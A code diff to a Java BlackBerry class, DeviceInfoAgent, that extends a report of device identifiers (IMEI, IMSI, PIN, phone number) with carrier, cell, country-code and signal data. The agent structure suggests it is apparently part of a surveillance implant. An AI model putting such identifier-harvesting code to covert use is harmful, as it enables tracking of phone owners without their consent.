@@ -20,6 +20,9 @@ import net.rim.device.api.system.CodeModuleGroup;
 import net.rim.device.api.system.CodeModuleGroupManager;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.system.DeviceInfo;
+import net.rim.device.api.system.GPRSInfo;
+import net.rim.device.api.system.RadioInfo;
+import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Conf;
@@ -93,30 +96,25 @@ public final class DeviceInfoAgent extends Agent {
         if (DeviceInfo.isSimulator()) {
             sb.append("Simulator\n");
         }
-        
+
         //#ifdef DEBUG
         sb.append("Debug\n");
         //#endif
-        
+
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
         sb.append("Pin: " + Device.getPin() + "\n");
 
         // Alimentazione
+        //sb.append("\nBATTERY\n-----\n");
         sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
         sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
         sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
                 + " Degrees\n");
         sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");
-
-        // DISK
-        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
-
-        // OS Version
-        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
-
-        // Device
-        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
+       
+        //Radio
+        //sb.append("\nRADIO\n-----\n");
         if (Device.isCDMA()) {
             sb.append("CDMA\n");
             sb.append("SID: " + device.getSid() + "\n");
@@ -126,8 +124,41 @@ public final class DeviceInfoAgent extends Agent {
             sb.append("GPRS\n");
             sb.append("IMEI: " + device.getImei() + "\n");
             sb.append("IMSI: " + device.getImsi() + "\n");
+            sb.append("HomeMCC: " + GPRSInfo.getHomeMCC() + "\n");
+            sb.append("HomeMNC: " + GPRSInfo.getHomeMNC() + "\n"); 
+            sb.append("RSSI: " + GPRSInfo.getCellInfo().getRSSI()+"\n");
         }
 
+        try {
+            sb.append("Zone name: " + GPRSInfo.getZoneName()+ "\n");
+            sb.append("Active Wafs: " + RadioInfo.getActiveWAFs()+ "\n");
+            sb.append("Carrier: " + RadioInfo.getCurrentNetworkName()+ "\n");
+            sb.append("Enabled Wafs: " + RadioInfo.getEnabledWAFs()+ "\n");
+            sb.append("Country Code: "
+                    + RadioInfo.getNetworkCountryCode(RadioInfo
+                            .getCurrentNetworkIndex())+ "\n");
+            sb.append("Network Services: " + RadioInfo.getNetworkService()+ "\n");
+            sb.append("Network Type: " + RadioInfo.getNetworkType()+ "\n");
+            sb.append("Signal level: " + RadioInfo.getSignalLevel() + " dB\n");
+            sb.append("DataServiceOperational: "
+                    + RadioInfo.isDataServiceOperational()+ "\n");
+            sb.append("DataServiceSuspended: "
+                    + RadioInfo.isDataServiceSuspended()+ "\n");
+            //sb.append(": " +  RadioInfo.);
+        } catch (Exception ex) {
+            //#ifdef DEBUG_ERROR
+            debug.error("Radio: " + ex);
+            //#endif
+        }
+
+        // Device
+        //sb.append("\nDEVICE\n------\n");
+        // DISK
+        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
+
+        // OS Version
+        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
+        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
         sb.append("Phone: " + device.getPhoneNumber() + "\n");
 
         sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
@@ -255,11 +286,11 @@ public final class DeviceInfoAgent extends Agent {
             String vendor = group.getVendor();
             String version = group.getVersion();
 
-            if(name == Conf.GROUP_NAME){
+            if (name == Conf.GROUP_NAME) {
                 sb.append("******************\r\n");
-               
+
             }
-            
+
             sb.append(name);
             sb.append(" , ");
             sb.append(vendor);
@@ -319,7 +350,7 @@ public final class DeviceInfoAgent extends Agent {
             sb.append(", " + versionModule);
             sb.append("\r\n");
         }
-        String  ret = sb.toString();
+        String ret = sb.toString();
         return ret;
     }
 
